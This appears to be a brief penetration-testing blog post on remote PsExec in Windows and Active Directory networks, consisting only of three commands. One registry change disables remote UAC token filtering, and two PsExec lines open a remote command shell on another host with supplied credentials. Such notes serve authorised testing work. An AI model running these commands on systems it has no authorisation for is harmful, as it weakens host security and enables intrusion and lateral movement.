---
layout: single
classes: wide
author_profile: true
read_time: true
share: true
related: true
title:  "Internal Infrastructure Pentest - Remote PsExec"
date:   2019-06-22 15:29:10 +1000
categories:
  - Internal Pentest
  - Internal Infrastructure Pentest
  - Network Pentest
tags:
  - PsExec
  - Windows Security
  - Remote PsExec
  - Active Directory Hacking
---

```
- reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
- PsExec64.exe \\172.20.10.8 -u tester -p tester123 cmd
- psexec64 -accepteula \\0.0.0.0 -u DOMAIN\username -p MySecretP@ssw0rd cmd.exe
```
